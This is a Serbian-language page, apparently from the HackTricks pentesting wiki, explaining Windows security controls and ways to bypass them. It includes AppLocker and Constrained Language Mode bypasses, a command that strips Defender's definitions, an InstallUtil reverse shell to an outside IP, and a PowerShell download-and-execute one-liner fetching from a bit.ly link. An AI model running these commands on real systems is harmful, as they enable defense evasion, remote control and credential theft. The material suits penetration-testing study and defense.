# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

Whitelist aplikacija je lista odobrenih softverskih aplikacija ili izvršnih datoteka kojima je dozvoljeno da budu prisutne i da se pokreću na sistemu. Cilj je zaštititi okruženje od štetnog malware-a i neodobrenog softvera koji nije u skladu sa konkretnim poslovnim potrebama organizacije.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) je Microsoft-ovo **rešenje za application whitelisting** i administratorima sistema omogućava kontrolu nad tim **koje aplikacije i datoteke korisnici mogu da pokreću**. Omogućava **granularnu kontrolu** nad izvršnim datotekama, skriptama, Windows installer datotekama, DLL-ovima, paketiranim aplikacijama i installerima paketiranih aplikacija.\
Uobičajeno je da organizacije **blokiraju cmd.exe i PowerShell.exe** i ograniče pristup za pisanje u određene direktorijume, **ali sve ovo može da se zaobiđe**.

### Provera

Proverite koje datoteke/ekstenzije su na blacklisti/whitelisti:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Ova putanja registra sadrži konfiguracije i politike koje primenjuje AppLocker, pružajući način za pregled trenutnog skupa pravila koja se sprovode na sistemu:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- Korisni **Writable folders** za bypass AppLocker Policy: Ako AppLocker dozvoljava izvršavanje bilo čega unutar `C:\Windows\System32` ili `C:\Windows`, postoje **writable folders** koje možete koristiti da **bypass** ovo.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Uobičajeno **trusted** [**"LOLBAS"**](https://lolbas-project.github.io/) binaries takođe mogu biti korisni za zaobilaženje AppLocker-a.
- **Loše napisane rules takođe mogu biti zaobiđene**
- Na primer, kod **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, možete kreirati **folder pod nazivom `allowed`** bilo gde i on će biti dozvoljen.
- Organizacije se takođe često fokusiraju na **blokiranje `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable-a**, ali zaboravljaju na **druge** [**lokacije PowerShell executable-a**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), kao što su `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` ili `PowerShell_ISE.exe`.
- **DLL enforcement** je veoma retko omogućen zbog dodatnog opterećenja koje može izazvati na sistemu i količine testiranja potrebne da bi se osiguralo da se ništa neće pokvariti. Zato će korišćenje **DLL-ova kao backdoor-a pomoći u zaobilaženju AppLocker-a**.
- Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) da **izvršite Powershell** kod u bilo kom procesu i zaobiđete AppLocker. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Čuvanje kredencijala

### Security Accounts Manager (SAM)

Lokalni kredencijali se nalaze u ovoj datoteci, a lozinke su hash-ovane.

### Local Security Authority (LSA) - LSASS

**Kredencijali** (hash-ovani) se **čuvaju** u **memoriji** ovog podsistema zbog Single Sign-On razloga.\
**LSA** upravlja lokalnom **security policy** (policy lozinki, dozvole korisnika...), **authentication**, **access tokens**...\
LSA će biti taj koji će **proveravati** dostavljene kredencijale unutar **SAM** datoteke (za lokalni login) i **komunicirati** sa **domain controller-om** radi autentifikacije korisnika domena.

**Kredencijali** se **čuvaju** unutar **LSASS procesa**: Kerberos tickets, NT i LM hash-ovi, lako dešifrujuće lozinke.

### LSA secrets

LSA može sačuvati određene kredencijale na disku:

- Lozinku računa računara u Active Directory-ju (nedostupan domain controller).
- Lozinke računa Windows servisa
- Lozinke za scheduled tasks
- Ostalo (lozinka IIS aplikacija...)

### NTDS.dit

To je baza podataka Active Directory-ja. Prisutan je samo na Domain Controller-ima.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) je Antivirus koji je dostupan u Windows 10 i Windows 11, kao i u verzijama Windows Server-a. On **blokira** uobičajene pentesting alate kao što je **`WinPEAS`**. Međutim, postoje načini da se **ove zaštite zaobiđu**.

### Provera

Da biste proverili **status** **Defender-a**, možete izvršiti PS cmdlet **`Get-MpComputerStatus`** (proverite vrednost **`RealTimeProtectionEnabled`** da biste utvrdili da li je aktivan):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Da biste ga enumerisali, možete takođe pokrenuti:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS štiti datoteke pomoću enkripcije, koristeći **simetrični ključ** poznat kao **File Encryption Key (FEK)**. Ovaj ključ se enkriptuje korisnikovim **javnim ključem** i čuva unutar **alternative data stream** $EFS enkriptovane datoteke. Kada je potrebna dekripcija, odgovarajući **privatni ključ** korisnikovog digitalnog sertifikata koristi se za dešifrovanje FEK-a iz $EFS stream-a. Više detalja možete pronaći [ovde](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Scenariji dekripcije bez inicijacije korisnika** uključuju:

- Kada se datoteke ili folderi premeste na file system koji ne podržava EFS, kao što je [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), automatski se dekriptuju.
- Enkriptovane datoteke poslate preko mreže putem SMB/CIFS protokola dekriptuju se pre slanja.

Ovaj metod enkripcije omogućava vlasniku **transparentan pristup** enkriptovanim datotekama. Međutim, samo promena lozinke vlasnika i prijavljivanje neće omogućiti dekripciju.

**Ključne napomene**:

- EFS koristi simetrični FEK, enkriptovan korisnikovim javnim ključem.
- Dekripcija koristi korisnikov privatni ključ za pristup FEK-u.
- Automatska dekripcija se izvršava pod određenim uslovima, kao što su kopiranje na FAT32 ili mrežni prenos.
- Vlasnik može pristupiti enkriptovanim datotekama bez dodatnih koraka.

### Provera EFS informacija

Proverite da li je **korisnik** **koristio** ovaj **service** tako što ćete proveriti da li ova putanja postoji:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Proverite **ko** ima **pristup** datoteci pomoću cipher /c \<file>\
Takođe možete koristiti `cipher /e` i `cipher /d` unutar foldera za **enkripciju** i **dekripciju** svih datoteka

### Dekripcija EFS datoteka

#### Biti Authority System

Ovaj način zahteva da **victim user** ima **pokrenut** **process** unutar hosta. Ako je to slučaj, pomoću `meterpreter` sessions možete impersonate token procesa korisnika (`impersonate_token` iz `incognito`). Ili možete samo izvršiti `migrate` na process korisnika.

#### Poznavanje lozinke korisnika

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft je razvio **Group Managed Service Accounts (gMSA)** radi pojednostavljivanja upravljanja service accounts u IT infrastructures. Za razliku od tradicionalnih service accounts, kod kojih je često omogućena postavka "**Password never expire**", gMSA pružaju bezbednije rešenje kojim je lakše upravljati:

- **Automatic Password Management**: gMSA koriste složenu lozinku od 240 karaktera koja se automatski menja u skladu sa domain ili computer policy. Ovim procesom upravlja Microsoft-ov Key Distribution Service (KDC), čime se eliminiše potreba za ručnim ažuriranjem lozinke.
- **Enhanced Security**: Ovi accounts nisu podložni lockout-u i ne mogu se koristiti za interactive logins, čime se povećava njihova bezbednost.
- **Multiple Host Support**: gMSA se mogu deliti na više hosts, što ih čini idealnim za services koji rade na više servers.
- **Scheduled Task Capability**: Za razliku od managed service accounts, gMSA podržavaju pokretanje scheduled tasks.
- **Simplified SPN Management**: Sistem automatski ažurira Service Principal Name (SPN) kada dođe do promena u sAMaccount detaljima računara ili DNS name-u, čime se pojednostavljuje upravljanje SPN-om.

Lozinke za gMSA čuvaju se u LDAP property _**msDS-ManagedPassword**_ i Domain Controllers (DCs) ih automatski resetuju svakih 30 dana. Ova lozinka, enkriptovani data blob poznat kao [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), može se preuzeti samo od strane ovlašćenih administratora i servers na kojima su gMSA instalirani, čime se obezbeđuje bezbedno okruženje. Za pristup ovim informacijama potrebna je secured connection, kao što je LDAPS, ili connection mora biti authenticated pomoću 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Ovu lozinku možete pročitati pomoću [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pronađite više informacija u ovoj objavi**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Takođe, pogledajte ovu [web stranicu](https://cube0x0.github.io/Relaying-for-gMSA/) da biste saznali kako da izvedete **NTLM relay attack** za **čitanje** **lozinke** za **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

**Local Administrator Password Solution (LAPS)**, dostupno za preuzimanje sa [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) veb lokacije, omogućava upravljanje lozinkama lokalnog Administratora. Ove lozinke, koje su **nasumične**, jedinstvene i **redovno se menjaju**, centralno se čuvaju u Active Directory-ju. Pristup ovim lozinkama ograničen je putem ACL-ova na ovlašćene korisnike. Uz dodeljene dovoljne dozvole, omogućeno je čitanje lozinki lokalnog administratora.

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **ograničava mnoge funkcije** potrebne za efikasno korišćenje PowerShell-a, kao što su blokiranje COM objekata, dozvoljavanje samo odobrenih .NET tipova, tokovi rada zasnovani na XAML-u, PowerShell klase i drugo.

### **Provera**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
U aktuelnim verzijama Windowsa taj Bypass neće raditi, ali možete koristiti [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Za kompajliranje možda ćete morati** **da** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> dodajte `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` i **promenite projekat na .Net4.5**.

#### Direktni bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Možete koristiti [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) za **izvršavanje Powershell** koda u bilo kom procesu i zaobilaženje constrained mode-a. Za više informacija pogledajte: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## PS Execution Policy

Podrazumevano je podešeno na **restricted.** Glavni načini za zaobilaženje ove policy:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Više informacija možete pronaći [ovde](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

To je API koji se može koristiti za autentifikaciju korisnika.

SSPI je zadužen za pronalaženje odgovarajućeg protokola za dve mašine koje žele da komuniciraju. Preferirani metod za ovo je Kerberos. SSPI zatim pregovara o tome koji će se protokol za autentifikaciju koristiti. Ovi protokoli za autentifikaciju nazivaju se Security Support Provider (SSP), nalaze se unutar svake Windows mašine u obliku DLL datoteke i obe mašine moraju podržavati isti protokol da bi mogle da komuniciraju.

### Main SSPs

- **Kerberos**: Preferirani protokol
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** i **NTLMv2**: Zbog kompatibilnosti
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web serveri i LDAP, lozinka u obliku MD5 hash-a
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL i TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Koristi se za pregovaranje o protokolu koji će se koristiti (Kerberos ili NTLM, pri čemu je Kerberos podrazumevani)
- %windir%\Windows\System32\lsasrv.dll

#### Pregovaranjem može biti ponuđeno više metoda ili samo jedna.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje za aktivnosti sa povišenim privilegijama**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [Zaobilaženje Applocker-a i ograničenog jezičkog režima PowerShell-a](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [kako dešifrovati EFS datoteke](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Relaying for gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 načina za zaobilaženje PowerShell Execution Policy-ja](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
